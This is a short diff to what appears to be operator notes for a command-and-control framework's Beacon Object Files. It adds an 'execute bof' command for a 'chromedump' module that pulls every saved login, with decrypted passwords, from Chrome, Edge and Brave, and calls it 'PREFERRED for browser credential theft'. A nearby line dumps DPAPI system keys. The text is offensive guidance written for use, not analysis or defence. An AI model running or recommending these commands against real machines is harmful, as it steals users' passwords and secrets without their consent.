@@ -157,6 +157,7 @@ These BOFs take no arguments and are safe to run directly:
 
 #### Credentials (no-args)
 - execute bof {BOF}get_dpapi_system/get_dpapi_system.x64.o — DPAPI system keys (needs SYSTEM)
+- execute bof {BOF}chromedump/chromedump.x64.o             — Dump ALL saved logins from Chrome/Edge/Brave (URL + user + decrypted password). No args, handles AES-GCM + DPAPI automatically. PREFERRED for browser credential theft — one command gets everything.
 
 ### Packed Arguments Required — Need ax.bof_pack() param_data
 
